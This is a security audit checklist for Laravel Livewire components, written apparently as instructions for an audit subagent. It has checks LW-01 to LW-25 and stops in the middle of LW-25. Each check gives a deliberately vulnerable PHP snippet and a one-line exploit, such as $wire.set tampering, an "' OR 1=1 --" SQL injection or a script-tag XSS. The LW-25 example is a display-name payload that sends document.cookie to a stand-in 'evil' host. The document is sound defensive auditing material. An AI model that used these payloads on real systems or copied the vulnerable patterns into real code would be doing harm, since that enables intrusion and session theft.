# Livewire Security Audit Checklist

This file is the auditing rulebook. You (the audit subagent) receive it verbatim along
with version notes and a batch of component file paths. Read each component's class and
view (plus the JS file for v4 multi-file components), then work every check below against
the code in front of you.

## How to report

Report only what you can quote from the code you were given. Do not infer behavior from
file names, route names, or what a component "probably" does. If the evidence is not in
the file, it is not a finding.

Every finding MUST include: **file and line** (absolute path, line of the offending
code); **check ID** (`LW-NN`); **severity** (per the scale and per-check guidance);
**evidence quote** (the actual offending code, copied exactly, not paraphrased);
**exploit scenario** (one concrete sentence — what the attacker types, e.g.
`$wire.set('amount', 0)`, and what they gain); **fix pattern** (the `fixes.md` name in the
check entry).

When you cannot be certain a finding is real — authorization might live in a trait you
cannot see, a policy might be applied upstream, the property might be locked by a parent —
**report it anyway with a `needs main-thread confirmation` marker** and state exactly what
you could not verify. Do not silently drop an uncertain finding, and do not inflate it to
a confident one. The main thread re-reads every flagged location and confirms or discards
it; your job is honest candidates, not the final filter.

If a component is clean against a check, say nothing about that check for that component. A
clean component is a real, reportable result — do not invent findings to justify the run.

Several checks can fire on the same line (an unlocked id that is also untyped and feeds an
unauthorized action violates LW-02, LW-23, and LW-01). In YOUR candidate report, group them
under the most specific check and list every other applicable check ID inside that candidate
(this keeps your output readable). The main thread re-splits findings by fix during
consolidation — checks with different fixes become separate report blocks — so do not worry
about final block structure; just make sure every applicable LW-NN is named somewhere. Never let a check go
unmentioned because a sibling check already covered the line — the main thread needs every
applicable ID. Work the checklist as a literal checklist: for each component, walk
LW-01 through LW-27 in order and consciously decide hit/clean for each before moving on;
do not stop at the first few obvious findings on a busy component.

## Severity scale

- **Critical** — exploitable now for data theft, privilege escalation, or financial harm
  (unauthorized destructive action, tamperable price/ID driving a write, secrets in
  snapshot).
- **High** — exploitable with modest effort or one missing precondition.
- **Medium** — requires unusual circumstances, or weakens defense in depth materially.
- **Low** — hardening (missing type declarations on non-sensitive properties, morphMap).
- **Info** — observations worth knowing, no action required.

---

## LW-01: Action authorization

Severity guidance: Critical when the method runs a destructive, financial, or
ownership-changing operation (delete, refund, approve, transfer, role change) with no
authorization; High when it mutates state the caller should not control with limited blast
radius; Medium when it only reads data the caller is not entitled to.

Look for: every public method on the component (other than `render` and Livewire lifecycle
hooks) is callable from the browser via `$wire.methodName(...)` whether or not any
`wire:click` references it. The callable surface is exactly the subclass-defined public
methods minus `render`, plus framework magic methods `__dispatch`, `__lazyLoad`,
`__lazyLoadIsland` (those three carry checksum-protected payloads — framework-controlled,
not app-callable). Flag any public method that performs an authorized-only operation with
no `Gate`/policy check, or that trusts its parameters as if they came from the UI. The
docs call unauthorized action parameters "arguably the most common security pitfall in
Livewire."

```php
public function deletePost($postId)
{
    Post::find($postId)->delete();   // no authorize(); attacker: $wire.deletePost(<any id>)
}
```

Why exploitable: the attacker opens devtools on any page mounting this component, calls
`$wire.deletePost(7)` with an ID they do not own, and — with no UI gate and no server-side
ownership/policy check — the delete runs.

Version notes: identical in v3 and v4; the callable-surface rule is the same. v4 just adds
single-file and multi-file layouts, so also inspect the embedded `new class extends
Component` block, not only `app/Livewire/` classes.

When the unauthorized method is also referenced by NO `wire:` directive anywhere in the
template, additionally tag LW-07 in the same block — an unwired public method is both an
authorization gap and unnecessary public surface.

Fix: see fixes.md "authorize-in-action"

---

## LW-02: `#[Locked]` on tamperable scalars

Severity guidance: Critical when the unlocked scalar is an identity, ownership key, price,
quantity, or money/secret value driving a write; High when it drives a query or permission
decision; Medium when tampering only corrupts non-sensitive UI state.

Look for: public scalar properties holding identity/ownership/pricing/quantity or a
state-machine state, set once in `mount()`, later trusted in an action, with no `#[Locked]`
attribute. Any unlocked public property is writable via `$wire.set('prop', value)` or an
injected `wire:model`. `#[Locked]` makes a client-driven write throw
`CannotUpdateLockedPropertyException` (a bare HTTP 419 in production).

Exclusion: a property the user legitimately edits through `wire:model` (a recipient
picker, a form field) must NOT be locked — locking breaks the bind. Its protection is
validation plus authorization (LW-19/LW-01), not this check. LW-02 targets properties the
client never legitimately writes.

```php
public $postId;            // set in mount($id), used in delete()
public function delete()
{
    Post::findOrFail($this->postId)->delete();   // attacker: $wire.set('postId', <any id>)
}
```

Why exploitable: the attacker runs `$wire.set('postId', 999)` to point the property at a
record they do not own, then triggers `delete()`; the unlocked property accepts the
substituted ID and the action runs against it.

Version notes: identical in v3 and v4. When the value is an Eloquent record, the
alternative fix is to type the property as the model (`public Post $post`) — model-typed
properties are immutable from the client via a different mechanism (the model synthesizer
refuses direct sets and serializes only class+key), so the ID cannot be swapped.

Fix: see fixes.md "lock-scalar" (alternative: "model-typed-property")

---

## LW-03: Public-by-habit properties

Severity guidance: Medium when the property holds data the client should not change and it
influences server logic; Low when it is merely unnecessary public surface with no
sensitive use. Escalate if it overlaps LW-08 (sensitive value in snapshot).

Look for: public properties the client never needs to round-trip — internal counters,
resolved flags, cached lookups, computed intermediates — declared `public` out of habit.
They are both a tamper surface (LW-02/LW-04) and a snapshot-exposure surface (LW-08). When
the value is derived from other state, prefer `#[Computed]` (derived, never serialized,
never client-settable).

Do NOT report harmless UI state: a property that only affects presentation (a success
flag gating a thank-you message, an open/closed accordion boolean, a tab label) where
tampering has zero security or data consequence is CLEAN, not a finding at any severity.
This check fires only when the property's value influences server-side logic, exposes
non-trivial data, or its tampering has a consequence beyond the attacker's own UI.

```php
public $isAdmin;            // derived from auth, never needs client input
public function mount() { $this->isAdmin = auth()->user()->isAdmin(); }
// attacker: $wire.set('isAdmin', true) -> privilege escalation in later checks
```

Why exploitable: the attacker runs `$wire.set('isAdmin', true)` and any later code
branching on `$this->isAdmin` takes the privileged path; a derived value that never needs
client input is pure unnecessary risk as a writable public property.

Version notes: identical in v3 and v4. `protected`/`private` properties do not persist
between Livewire requests — if the value must survive round-trips, `#[Computed]` (re-derived
each request) is the correct replacement, not visibility alone.

Fix: see fixes.md "computed-instead-of-public"

---

## LW-04: `wire:model` reach

Severity guidance: Critical when a client-writable property drives a payment, write, or
permission check on money/ownership; High when it drives a query returning data the caller
should not see; Medium otherwise.

Look for: any unlocked public property bound with `wire:model` in the view — or that an
attacker could write with `$wire.set()` even with no `wire:model` present — whose value
then flows into a query, write, payment amount, or authorization decision. The attack does
not require UI binding; an attacker injects `$wire.set()` calls regardless.

This check fires on ANY client-writable property reaching a sensitive sink — including a
property that is LEGITIMATELY `wire:model`-bound (a recipient picker, an account selector).
Do not skip LW-04 just because the field is a real form input you cannot lock. The fix
splits by case:
- Property the client never legitimately edits (set in `mount()`, no `wire:model`):
  lock it — this overlaps LW-02, tag both, one block, fix `lock-scalar`.
- Property the user legitimately edits via `wire:model` that drives a write/query: it
  cannot be locked, so the control is server-side validation + authorization. Tag LW-04
  alongside LW-19 in the same block; the fix is `validate-untrusted-binding`, not locking.

Either way LW-04 must appear — a bound id that drives `Model::create(['x' => $this->id])`
is an LW-04 finding even when LW-19 also fires.

```php
public $recipientId;   // bound: <input wire:model="recipientId">
public function send() {
    Message::create(['recipient_id' => $this->recipientId, 'body' => $this->body]);
    // attacker sets recipientId to any user id; no exists/authorization check
}
```

Why exploitable: the attacker edits the bound value (or calls
`$wire.set('recipientId', <victim id>)`) so the write targets a record they should not be
able to address, and calls the action; the unlocked property accepts it and the write runs
against the attacker-chosen target.

Version notes: identical in v3 and v4.

Fix: see fixes.md "validate-untrusted-binding" (legitimately-bound field) or "lock-scalar"
(field the client never edits)

---

## LW-05: `#[On]` listeners

Severity guidance: Critical when the listener performs a destructive or financial action
on attacker-supplied payload; High when it mutates state the caller should not control;
Medium when it only refreshes or reads.

Look for TWO declaration styles, grep for BOTH:
- attribute style: `#[On('event-name')]` on a method;
- the legacy array property `protected $listeners = ['event-name' => 'methodName'];` (v3
  idiom, still honored in v4) — an auditor grepping only for `#[On(` misses every listener
  declared this way, and the target methods are equally browser-dispatchable.
Both register listeners dispatchable directly from the browser via
`Livewire.dispatch('event-name', {...})`, with a fully attacker-controlled payload — not
limited to events your own components emit. Treat the payload like action input: authorize
and validate every field. Dynamic event names (`#[On('post.{postId}')]` / `'order.{id}' =>
'refresh'`) resolve the `{placeholder}` from component state, so a client-writable property
in the placeholder lets the attacker influence which events bind — audit those too.

Precision note: a listener method that already carries an authorization ATTRIBUTE (e.g.
`#[Can('update', 'post')]`) IS checked by the dispatch path, so do not flag it as
unauthorized; the gap is a listener relying on an in-body Gate call that is absent, or no
check at all.

```php
#[On('post-approved')]
public function approve($postId)
{
    Post::find($postId)->update(['approved' => true]);  // no authorize; payload from client
}
// attacker: Livewire.dispatch('post-approved', {postId: 7})
```

Why exploitable: the attacker runs `Livewire.dispatch('post-approved', {postId: 7})`;
Livewire routes the event to the listener with the attacker's payload, and with no
authorization and no validation the approval runs on an arbitrary record.

Version notes: identical in v3 and v4; the `Livewire.dispatch` API and browser-
dispatchable `#[On]` behavior are unchanged.

Fix: see fixes.md "authorize-in-action"

---

## LW-06: `#[Url]` properties

Severity guidance: High when the query-string value drives a query or write without
validation; Medium when it only filters non-sensitive display; Low when it is a benign UI
toggle.

Look for: public properties decorated with `#[Url]`. Their initial value comes straight
from the request query string — untrusted input present from the first render, before any
`wire:model` interaction. Flag where such a property reaches a query, authorization
decision, or write without being validated and constrained first.

```php
#[Url]
public $sort = 'created_at';
public function posts() {
    return Post::orderByRaw($this->sort)->get();   // ?sort=... -> raw SQL from query string
}
```

Why exploitable: the attacker crafts `?sort=<payload>` and the unvalidated query-string
value flows straight into the query; because `#[Url]` hydrates the property before any
check, the malicious value is live on the first render.

Version notes: identical in v3 and v4.

Fix: see fixes.md "validate-untrusted-binding"

---

## LW-07: Public helper methods

Severity guidance: High when the helper performs or enables a privileged operation
(visibility change, state transition, send); Medium when it leaks data; Low when it is
harmless but needlessly public.

Look for: public methods that exist only as internal helpers — view helpers, formatters,
state transitions no `wire:click` references — yet sit on the callable surface (subclass
public methods minus `render`, plus the three framework magic methods). A common dangerous
variant is a visibility/state-change helper (`publish()`, `makePublic()`, `setStatus()`)
the UI calls only after a guarded step, but which the client can call directly, skipping
the guard.

```php
public function makePublic()        // meant to run only after a paywall check elsewhere
{
    $this->report->update(['visibility' => 'public']);  // attacker: $wire.makePublic()
}
```

Why exploitable: the attacker calls `$wire.makePublic()` straight from devtools, bypassing
the UI flow (payment, confirmation, ownership gate) that was supposed to precede it; every
public method is callable regardless of the UI and this one has no authorization of its
own.

Version notes: identical in v3 and v4.

Fix: see fixes.md "authorize-in-action" (visibility-change variant: add the same
ownership/policy check the guarded flow relied on)

---

## LW-08: Sensitive data in serialized properties

Severity guidance: Critical when the leaked value is a secret, token, full PII record, or
another user's private data; High when it is internal data not meant to be public; Medium
when low-sensitivity but still unintended exposure.

Look for: public properties holding scalars, arrays, or plain (non-Eloquent) Collections.
These serialize **fully** into the `wire:snapshot` attribute in the page HTML — anyone can
view-source or read the DOM to see every value. Eloquent models and Eloquent Collections
are safe here: they serialize as class + key only (attributes never sent). The leak vector
is everything that is not an Eloquent model/collection.

```php
public $apiToken;          // scalar -> full value lands in wire:snapshot in page source
public array $allUsersPii; // array  -> every element serialized into the HTML
public function mount() { $this->apiToken = config('services.x.token'); }
```

Why exploitable: the attacker view-sources the page (or reads the DOM `wire:snapshot`) and
reads the value in plaintext, no tampering needed — scalars and arrays serialize in full,
so a secret or another user's data on a public property is visible to anyone who loads the
page.

The snapshot is not the only leak channel. Sensitive data also reaches the browser through
the `dispatches` effect (`$this->dispatch('e', secret: ...)` — see LW-26) and the `xjs`
effect (`$this->js("... {$secret} ...")` — see LW-25), neither of which lives in
`wire:snapshot`. Do not conclude "no public property holds it, so it is safe" without
checking those two channels.

Version notes: identical in v3 and v4; scalar/array/plain-collection serialization vs
Eloquent class+key is the same. Note `$hidden` on a model gives no snapshot protection — see
LW-09.

Fix: see fixes.md "computed-instead-of-public"

---

## LW-09: Model attributes copied into scalars

Severity guidance: Critical when the copied attribute is a secret or another user's
sensitive PII; High when it is private data of the current user not meant for page source;
Medium for low-sensitivity attributes.

Look for: code copying a model attribute into a public scalar/array — `$this->email =
$user->email`, `$this->ssn = $user->ssn`, `$this->data = $user->toArray()`. The model
itself is protected (class+key serialization), but copying an attribute into a public
scalar puts the **value** in the snapshot. Critically, `$hidden` gives no protection here:
model protection is structural (key-only serialization), and `$hidden` is never consulted
when you assign the raw value to a public property.

```php
public $email;
public function mount(User $user) {
    $this->email = $user->email;     // value now in wire:snapshot, $hidden irrelevant
}
```

Why exploitable: the attacker view-sources the page and reads the copied attribute
directly from `wire:snapshot`; developers assume `$hidden`/`$guarded` shield it, but those
only affect model serialization — once the raw attribute is on a public property it
serializes in full like any scalar.

Version notes: identical in v3 and v4.

Fix: see fixes.md "computed-instead-of-public"

---

## LW-10: `#[Computed(cache: true)]` on user-scoped data

Severity guidance: Critical when the cached value is per-user sensitive data (another user
could receive it); High when it is user-scoped non-sensitive data that still leaks across
users; Medium when the scope error is real but the data is low-sensitivity.

Look for: computed methods with `#[Computed(cache: true)]` whose body depends on the
current user, current request, or any per-instance state. `cache: true` stores **one**
value shared across every component instance application-wide — the first user to populate
it serves their data to everyone else until it expires.

```php
#[Computed(cache: true)]
public function profile() {
    return auth()->user()->load('privateRelations');  // one shared value for ALL users
}
```

Why exploitable: the first user to load the component caches their profile under a global
key; every subsequent user — across sessions and accounts — gets that cached object back
instead of their own, leaking the first user's data until the entry clears.

Version notes: identical in v3 and v4; `#[Computed(cache: true)]` semantics (one
application-wide shared value) are the same.

Fix: see fixes.md "scope-computed-cache"

---

## LW-11: `#[Computed(persist: true)]` with sensitive data

Severity guidance: High when sensitive per-user data is persisted with a long or default
TTL; Medium when the data is non-sensitive but the TTL is needlessly long; Low when the
persisted value is trivial.

Look for: computed methods with `#[Computed(persist: true)]` returning sensitive data.
`persist: true` stores the value in the Laravel cache per component instance (keyed per
instance, not globally shared like `cache: true`) with a default TTL of 3600 seconds. Flag
long TTLs on sensitive output, and any persisted value whose staleness or storage-at-rest
is a problem. Check every `#[Computed]` on the component independently — a `cache: true`
finding (LW-10) on one method does NOT cover a `persist:` problem on another; they are
separate findings with separate blocks.

```php
#[Computed(persist: true, seconds: 86400)]
public function balance() {
    return $this->account->sensitiveBalance();   // sits in Laravel cache for a day
}
```

Why exploitable: the sensitive value is written to the Laravel cache backend (Redis, file,
database — wherever the app's cache lives) and held for the TTL, widening at-rest exposure
and serving a stale value long after the underlying data changed; a long TTL leaves it in
shared cache storage well beyond the request that produced it.

Version notes: identical in v3 and v4; `persist:` is per-instance Laravel-cache storage
with a 3600s default in both.

Fix: see fixes.md "scope-computed-cache"

---

## LW-12: Class-name leakage

Severity guidance: Low standalone — this is hardening / information disclosure, not a
direct exploit. Note in Info if the class names are already public knowledge.

Look for: components and models whose fully-qualified class names appear in the
`wire:snapshot` (every Eloquent model serializes as its FQCN under `class`, and the
component class is named in the memo). Recommend a `morphMap` to alias model class names so
internal namespace structure is not advertised in page source.

This is an APP-LEVEL check: the fix is one `morphMap` registration. As a subagent, just
note which components hold Eloquent models; do not raise a per-component finding. The main
thread reports LW-12 at most once, against the provider where the morphMap is missing.

```php
// snapshot exposes: "class":"App\\Models\\Internal\\BillingAccount"
// no morphMap -> full namespace + class structure visible in page HTML
```

Why exploitable: the attacker reads the snapshot and learns your internal namespace and
model layout (e.g. `App\Models\Internal\BillingAccount`), aiding reconnaissance — this is
information disclosure, not a standalone breach; there is no direct data theft from the
class name alone.

Version notes: identical in v3 and v4; both serialize FQCNs and both honor Eloquent's
`morphMap` for aliasing.

Fix: see fixes.md "morph-map"

---

## LW-13: Sensitive values echoed in validation errors or flash messages

Severity guidance: High when the echoed value is a secret, token, or another user's PII;
Medium when it is the current user's sensitive data shown where it should not be; Low for
low-sensitivity leakage.

Look for: validation messages, flash messages, or thrown-error text that interpolate a
sensitive value — `"No user found for email {$email}"`, `"Invalid token {$token}"`, dumping
a model or array into a message. These strings render into the page (or into logs) and can
confirm or expose sensitive values. Also flag error responses that distinguish "user
exists" from "wrong password" in a way that enables enumeration.

```php
$this->addError('email', "No account for {$email} — try {$user->backup_email}");
// echoes another user's backup email into the rendered error
```

Why exploitable: the attacker submits crafted input and reads the resulting error, which
echoes a sensitive value (another user's email, a token, a record dump) or confirms an
account exists — the interpolated real value turns the error into an oracle leaking data
the attacker could not otherwise see.

Version notes: identical in v3 and v4.

Fix: see fixes.md "generic-error-messages"

---

## LW-14: File uploads

Severity guidance: High when uploads are accepted with no type/size validation (RCE-via-
upload, storage abuse, content-policy bypass); Medium when validation is partial; Low for
minor gaps with compensating controls.

Look for: components using `WithFileUploads` with a public property bound to `wire:model`
for a file. Two distinct gates, check BOTH:
- per-property `#[Validate('image|mimes:...|max:...')]` or a `rules()` entry — this gates
  what gets stored on the component's validate/update cycle;
- the GLOBAL `temporary_file_upload.rules` in `config/livewire.php` — this is the ONLY
  thing that gates the temporary-upload POST endpoint (`livewire/upload-file`). Its default
  is `['required','file','max:12288']`: 12 MB and ANY MIME type. So a property-level
  `#[Validate('image')]` does NOT stop an attacker from uploading a 12 MB arbitrary-type
  file to the temp endpoint — only the global rule does.
Flag a missing per-property rule AND a default/absent global rule; the global default is
effectively "any file up to 12 MB," which is the more dangerous gap.

```php
use WithFileUploads;
public $avatar;            // no #[Validate]; bound <input type="file" wire:model="avatar">
public function save() { $this->avatar->store('avatars'); }  // any file, any size
```

Why exploitable: the attacker uploads an arbitrary file type or oversized file (a PHP
script, an executable, a multi-gigabyte payload) because no `mimes`/`max` rule constrains
it — enabling, depending on how the stored file is served or processed, content-policy
bypass, storage exhaustion, or code execution.

Version notes: identical in v3 and v4; `WithFileUploads`, `#[Validate]`, and the global
`config/livewire.php` upload rules work the same. The temp-endpoint-vs-property-rule split
also applies to both versions.

Fix: see fixes.md "upload-rules"

---

## LW-15: Mass assignment

Severity guidance: Critical when client-settable state flows into a create/update that can
set ownership, role, price, or permission columns; High when it can set other unintended
columns; Medium when the model is well-guarded but the pattern is fragile.

Look for: `fill($this->all())`, `Model::create($this->all())`,
`$model->update($this->except(...))`, or `->fill($request)`-style patterns where the source
array is built from client-settable public properties. Every public property is
client-writable, so an attacker can introduce keys (`is_admin`, `user_id`, `price`) that
the mass assignment writes if the model is not strictly guarded.

ALSO flag a public ARRAY (or Form object) property passed whole to `create()`/`update()`/
`fill()` even without `$this->all()` — e.g. `Model::create($this->data)` or
`->fill($this->form->toArray())`. Livewire supports deep writes: `$wire.set('data.is_admin',
true)` injects a key into the array property `$data`, which the mass assignment then writes.
An auditor matching only `all()`/`except()` signatures gives a false negative here. (A
`#[Locked]` array property blocks these deep writes — the locked-attribute hook fires for any
path rooted at the locked name — so locking is a valid fix for an array that should not take
client-injected keys.)

```php
public function save() {
    Post::create($this->all());   // attacker adds user_id/is_featured via $wire.set
}

public array $data = [];
public function store() {
    Profile::create($this->data); // attacker: $wire.set('data.is_admin', true) injects a key
}
```

Why exploitable: the attacker uses `$wire.set('is_admin', true)` (or any fillable column
name) to inject an extra property, then triggers `save()`; `$this->all()` collects every
public property including the smuggled one, and the unguarded mass assignment writes the
attacker-chosen column.

Version notes: identical in v3 and v4; `$this->all()` collecting all public properties is
the same.

Fix: see fixes.md "explicit-fill"

---

## LW-16: Raw SQL interpolation

Severity guidance: Critical when a client-settable property is interpolated into raw SQL
reaching the database; High when interpolation is into a raw expression with partial
constraints; Medium when the input is constrained but the pattern is unsafe.

Look for: public properties (or action parameters) interpolated into `DB::raw(...)`,
`whereRaw(...)`, `orderByRaw(...)`, `havingRaw(...)`, `selectRaw(...)`, or string-built
queries. Any client-writable value inside a raw SQL string is a SQL injection vector. Use
parameter bindings, not string interpolation.

```php
public $search;
public function results() {
    return Post::whereRaw("title LIKE '%{$this->search}%'")->get();  // SQL injection
}
```

Why exploitable: the attacker sets `$wire.set('search', "' OR 1=1 --")` (or a UNION/
subquery payload) and the value is concatenated directly into the SQL string; with the
property client-writable and no bindings, the attacker controls the query and can read or
alter arbitrary data.

Version notes: identical in v3 and v4.

Fix: see fixes.md "bind-not-interpolate"

---

## LW-17: Unescaped output

Severity guidance: High when `{!! !!}` renders client-controlled data into the page
(stored/reflected XSS); Medium when the source is semi-trusted but not sanitized; Low when
the source is fully static/trusted.

Look for: `{!! ... !!}` (unescaped Blade echo) in component views where the interpolated
value is or could be user-controlled — a public property, a user-set model attribute,
request input. Unescaped output of any attacker-influenced string is an XSS vector. Prefer
`{{ }}` (escaped) or sanitize before echoing.

```blade
{{-- view --}}
<div>{!! $bio !!}</div>   {{-- $bio is a user-edited public property: stored XSS --}}
```

Why exploitable: the attacker stores `<script>...</script>` (or an event-handler payload)
in the user-controlled field; when the view renders it with `{!! !!}` the markup is emitted
unescaped, and any visitor who loads the component runs the attacker's script in their own
session.

Version notes: identical in v3 and v4; Blade `{!! !!}` vs `{{ }}` escaping is unchanged.

Fix: see fixes.md "escape-output"

---

## LW-18: Rate limiting

Severity guidance: High when an expensive or abusable action (login, password reset, mail
send, charge, OTP) has no throttle; Medium when throttling exists but is weak or
bypassable; Low for low-impact actions.

Look for: public methods that are expensive or abusable — authentication, sending
email/SMS/in-app messages, charging a card, generating a report, brute-forceable
lookups — with no rate limiting. A `send()`/`submit()`/`invite()` action on a component
that creates outbound records is in scope even when its other problems (validation,
authorization) are also being flagged — rate limiting is a separate finding. Core Livewire ships **no** general action rate limiter (only an internal
checksum-failure limiter, unrelated to app actions), so absence of an explicit throttle
means the action is unthrottled. The fix is the framework `RateLimiter::attempt`/
`tooManyAttempts`, or the third-party `danharrin/livewire-rate-limiting` package
(`WithRateLimiting` trait) — do not assume either is present; check.

```php
public function login() {
    // no RateLimiter, no WithRateLimiting -> unlimited credential-stuffing attempts
    if (Auth::attempt($this->credentials())) { /* ... */ }
}
```

Why exploitable: the attacker scripts `$wire.login()` (or dispatches the action) in a loop
with no server-side throttle, enabling credential stuffing, OTP brute force, mail-bomb
abuse, or cost amplification on a paid API — nothing in core Livewire limits the call rate.

Version notes: identical in v3 and v4; core ships no general action rate limiter in either,
and both rely on framework `RateLimiter` or the third-party package.

Fix: see fixes.md "rate-limit-action"

---

## LW-19: Validation quality

Severity guidance: High when a mutating action persists client input with no validation,
or validates an ID with `required` but no `exists:` and no ownership check; Medium when
rules are present but too loose; Low for cosmetic gaps.

Look for: mutating actions that persist before validating, or rules that do not actually
constrain. An ID property needs `exists:` **and** a server-side ownership check — `exists:`
alone confirms the row exists, not that the caller owns it. Validation is not
authorization: passing `exists:posts,id` does not mean the user may act on that post.

```php
public function update() {
    Post::find($this->postId)->update($this->data);  // no validate, no ownership check
}
// rules: ['postId' => 'required']  -> any existing id the attacker substitutes passes
```

Why exploitable: the attacker substitutes `$wire.set('postId', <victim id>)` and the action
either skips validation or validates only `required`, so the substituted ID passes and the
update runs on a record the attacker does not own; `exists:` would confirm the row is real
but still not that the caller owns it — authorization is the missing control.

Version notes: identical in v3 and v4.

Fix: see fixes.md "validate-untrusted-binding"

---

## LW-20: Persistent middleware

Severity guidance: High when custom auth/authorization middleware protects a component's
initial page load but is NOT re-applied to subsequent Livewire AJAX updates (the component
becomes reachable post-load without the guard); Medium when the gap is partial; Low when
compensating checks exist in every action.

Look for: CUSTOM middleware guarding a route that mounts a Livewire component
(subscription, role, tenant, feature-flag checks) that is not registered via
`Livewire::addPersistentMiddleware(...)`. Route middleware applies to the initial GET, but
subsequent Livewire update requests only re-run middleware on the persistent list. The
framework defaults are already on that list — `Authenticate` (`auth`), `Authorize`
(`can:`), `SubstituteBindings`, basic auth, and Sanctum/Jetstream auth middleware — so do
NOT flag routes guarded only by those. Flag custom app middleware that is absent from
`addPersistentMiddleware`. Note: middleware **arguments** are not supported in
`addPersistentMiddleware` — flag middleware that relies on parameters here.

```php
// route: Route::get('/billing', Billing::class)->middleware('subscribed');
// 'subscribed' NOT in Livewire::addPersistentMiddleware([...])
// -> guard runs on page load, but not on later $wire action requests
```

Why exploitable: the attacker loads the page once while still authorized (or with a guard
that only checks at load), then keeps issuing Livewire update/action requests after the
condition lapses — the un-persisted middleware never re-runs on those AJAX requests, so the
guard is silently absent for every interaction after the first render.

Version notes: identical in v3 and v4; `Livewire::addPersistentMiddleware()` and the
no-arguments limitation are the same.

Fix: see fixes.md "persistent-middleware"

---

## LW-21: Update route exposure

Severity guidance: almost always Info — record that the update route was checked. Escalate
to Low/Medium only for a genuinely odd customization (custom route on the wrong domain or
prefix, or wrapped in an extra middleware group that changes the auth context).

Look for: customizations to the Livewire update endpoint via `Livewire::setUpdateRoute(...)`.
IMPORTANT — do NOT report "the custom route dropped `web` so CSRF/session is lost": that is
not achievable. `setUpdateRoute()` force-injects the `web` group and the Livewire header
guard onto whatever route the callback returns, even if you omit them (verified,
src/Mechanisms/HandleRequests/HandleRequests.php). So you cannot strip CSRF/session through
this API. The only real findings are: the custom route placed on an unexpected domain/prefix,
or behind additional middleware that alters authentication/authorization for update requests.
If there is no `setUpdateRoute` call at all, the default is safe — report Info "default
update route, no customization."

```php
// AppServiceProvider — a real (narrow) finding: custom route on a different host
Livewire::setUpdateRoute(fn ($handle) =>
    Route::post('/lw/update', $handle)->domain('internal.example.com')  // different auth context
);
```

Why exploitable (when it is): a custom update route on a different domain or middleware group
can land in an auth context the rest of the app does not expect. The framework guarantees
`web` and the header guard regardless, so CSRF/session are NOT the vector — the misrouting is.

Version notes: identical in v3 and v4; `Livewire::setUpdateRoute()` exists and force-adds
`web` + the header guard in both.

Fix: see fixes.md "harden-update-route"

---

## LW-22: Full-page component route protection

Severity guidance: Critical when a guest-reachable full-page component exposes or mutates
data requiring auth/ownership with no in-component check either; High when auth is the only
missing layer but the component checks ownership internally; Medium for lesser exposure.

Look for: `Route::get(...)` (or `Volt::route`) pointing at a Livewire full-page component
that should require authentication/authorization but whose route carries no `auth` (or
appropriate) middleware — and whose `mount()`/actions do not compensate with their own
checks. Cross-reference route definitions against each full-page component.

```php
// routes/web.php
Route::get('/admin/users', AdminUsers::class);   // no ->middleware('auth'),
// and AdminUsers::mount() does no Gate check -> guests reach an admin panel
```

Why exploitable: the attacker simply navigates to `/admin/users` as a guest; with no
`auth`/authorization middleware on the route and no compensating check in `mount()`, the
full-page component renders its protected content and exposes its actions to anyone — no
tampering needed, the page is just open.

Version notes: identical in v3 and v4. v4 adds single-file/multi-file full-page components,
so check those route targets too, not only class-based components.

Fix: see fixes.md "protect-component-routes"

---

## LW-23: Native type declarations

Severity guidance: Low standalone — missing types are defense in depth, not a hole on their
own. Medium or higher when the untyped property feeds a query, write, or authorization
decision (the missing type then lets a smuggled array/object reach sensitive logic).

Look for: public properties and action-method parameters with no native type declaration.
An untyped public property accepts any JSON shape the client sends (string, array, object,
number) and hydrates it as-is. A typed property causes a PHP `TypeError` on a wrong-shaped
value, which Livewire catches: empty-string/null unsets the property to null, and any other
mismatch aborts with HTTP 419 in production. Typing constrains the accepted shapes — defense
in depth that closes the "smuggle an array where a scalar was expected" class, not a
standalone vulnerability.

```php
public $count;             // untyped: client can send {count: [1,2,3]} or {count: {...}}
public $userId;            // untyped: array/object smuggling reaches the query below
public function load() { User::where('id', $this->userId)->first(); }
```

Why exploitable: with the property untyped, the attacker sends an array or object where the
code expects a scalar and the unexpected shape reaches the query or write, potentially
confusing query builders or downstream logic; typing the property (`public int $count`,
`public ?int $userId`) makes PHP reject the wrong shape with a `TypeError` that Livewire
turns into a 419. On its own a missing type is hardening; it becomes material when the
property feeds sensitive logic.

Version notes: identical in v3 and v4; the typed-property `TypeError`-to-419 behavior (with
empty-string/null unsetting to null) is the same.

Fix: see fixes.md "type-everything"

---

## LW-24: Lifecycle hooks as mutation/authorization sinks

Severity guidance: Critical when a hook performs a destructive/financial/ownership write on
the incoming value with no authorization; High when it mutates state the caller should not
control; Medium when it runs an expensive query or external call on every update; Low when
the side effect is harmless.

Look for: lifecycle hook methods whose body performs a write, an authorization decision, an
expensive query, an external call, or a redirect using the incoming value or a public
property — `updated(...)`, `updating(...)`, `updated{Property}(...)`, `updating{Property}(...)`,
`hydrate(...)`/`hydrate{Property}(...)`, `boot()`, `booted()`, `mount(...)`. These are NOT on
the action callable surface (LW-01 explicitly skips them, and they cannot be invoked as
`$wire` actions), which is exactly why they get missed — but `updated{Prop}`/`updating{Prop}`
fire on EVERY update to that property (every keystroke under `wire:model.live`), receiving the
raw client value as the first argument. A side effect in the hook runs on untrusted input with
none of an action's authorization.

```php
public $status;
public function updatedStatus($value)   // fires on $wire.set('status', <anything>)
{
    $this->order->update(['status' => $value]);   // unauthorized write on client value
}
// attacker: $wire.set('status', 'refunded')  -> hook writes it, no wire:click, no Gate
```

Why exploitable: the attacker calls `$wire.set('status', 'refunded')` (no UI binding or
action needed); Livewire fires `updatedStatus` server-side with the attacker's value and the
write runs. The same shape DoS's the app when `updatedQuery()` runs an unbounded query on
every keystroke.

Version notes: identical in v3 and v4; the `updating*`/`updated*`/nested
`updated{Prop}_{key}` hook firing is the same (SupportLifecycleHooks).

Fix: see fixes.md "guard-lifecycle-hook"

---

## LW-25: `$this->js()` / `#[Js]` expression injection

Severity guidance: Critical when a user-controlled value is concatenated into the evaluated
expression (stored XSS in every viewer's session); High when the value is internal but
attacker-influenceable; Low when fully static.

Look for: `$this->js("...")` calls (or `#[Js]` methods) whose expression STRING interpolates
a user-controlled or model-derived value via concatenation. The expression is shipped to the
client as an `xjs` effect and evaluated as JavaScript in the browser — it is not Blade, so
`{{ }}` escaping does not apply and LW-17 does not cover it.

```php
$this->js("showToast('Welcome, {$user->display_name}')");
// display_name = "'); fetch('//evil/'+document.cookie); ('"  -> runs in every viewer's session
```

Why exploitable: the interpolated value becomes live JavaScript executed client-side; an
attacker who controls it (their own display name, a comment, any stored field) achieves XSS
that bypasses Blade escaping entirely — and sails past a CSP that allows `unsafe-eval`.

